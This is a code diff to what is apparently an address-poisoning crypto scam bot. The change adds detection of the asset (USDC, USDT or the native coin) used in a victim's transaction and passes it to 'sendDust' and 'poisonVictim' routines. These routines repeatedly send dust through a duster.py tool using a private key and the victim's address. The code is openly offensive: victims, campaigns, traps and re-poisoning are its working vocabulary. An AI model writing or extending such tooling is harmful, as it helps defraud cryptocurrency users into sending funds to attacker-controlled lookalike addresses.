@@ -282,8 +282,32 @@ function getDynamicCooldown(victimAddress) {
   return cooldown;
 }
 
-// ─── Send dust via duster.py ───
-async function sendDust(privateKey, victimAddress, campaignId) {
+// ─── Asset detection from transaction ───────────────
+function getAssetFromTx(tx, chainConfig) {
+  if (!tx || !tx.to) return null;
+
+  const tokens = chainConfig?.tokens || {};
+  const to = tx.to.toLowerCase();
+  const nativeSymbol = chainConfig?.nativeSymbol || 'ETH';
+
+  // Check if 'to' is a known token contract (USDC, USDT, etc.)
+  for (const [symbol, address] of Object.entries(tokens)) {
+    if (address.toLowerCase() === to) {
+      return symbol; // e.g., "USDC", "USDT"
+    }
+  }
+
+  // If value > 0 and 'to' is not a known token contract, assume native
+  if (tx.value && BigInt(tx.value) > 0n) {
+    return nativeSymbol; // e.g., "ETH", "BNB", "MATIC"
+  }
+
+  // Fallback: no asset identified
+  return null;
+}
+
+// ─── Send dust via duster.py (accepts optional asset) ──
+async function sendDust(privateKey, victimAddress, campaignId, asset = null) {
   const dusterPath = path.resolve(__dirname, '../tools/duster.py');
   // ✅ Use the virtual environment's Python interpreter
   const pythonCmd = path.resolve(__dirname, '../venv/bin/python3');
@@ -291,6 +315,9 @@ async function sendDust(privateKey, victimAddress, campaignId) {
   const env = { ...process.env, CHAIN: chainName };
   if (campaignId) {
     env.CAMPAIGN_ID = campaignId;
+  }
+  if (asset) {
+    env.DUST_ASSET = asset; // Pass the detected asset to duster
   }
 
   const cmd = `${pythonCmd} ${dusterPath} ${privateKey} ${victimAddress}`;
@@ -310,12 +337,12 @@ async function sendDust(privateKey, victimAddress, campaignId) {
   }
 }
 
-// --- Poison a victim ---
-async function poisonVictim(victimAddress, privateKey, campaignId) {
+// --- Poison a victim (accepts asset) ---
+async function poisonVictim(victimAddress, privateKey, campaignId, asset = null) {
   logger.info(`Re‑poisoning victim ${victimAddress}...`);
   let successCount = 0;
   for (let i = 0; i < DUST_RETRIES; i++) {
-    const ok = await sendDust(privateKey, victimAddress, campaignId);
+    const ok = await sendDust(privateKey, victimAddress, campaignId, asset);
     if (ok) successCount++;
     if (i < DUST_RETRIES - 1) {
       await new Promise(resolve => setTimeout(resolve, DELAY_BETWEEN_DUST_MS));
@@ -405,6 +432,14 @@ function checkTransaction(tx) {
   }
   trapLocks.set(entry.privateKey, true);
 
+  // ─── Detect asset from the transaction ───
+  const detectedAsset = getAssetFromTx(tx, chainCfg);
+  if (detectedAsset) {
+    logger.info(`[asset] Detected asset for re-poison: ${detectedAsset}`);
+  } else {
+    logger.info('[asset] No specific asset detected, will fallback to USDC/USDT');
+  }
+
   // Async Execution
   (async () => {
     try {
@@ -417,7 +452,8 @@ function checkTransaction(tx) {
         logger.warn(`Failed to send initial alert: ${alertErr.message}`);
       }
 
-      await poisonVictim(from, entry.privateKey, entry.campaignId);
+      // Pass the detected asset to poisonVictim
+      await poisonVictim(from, entry.privateKey, entry.campaignId, detectedAsset);
     } catch (err) {
       logger.error(`Error in async poison task for ${from}: ${err.message}`);
     } finally {
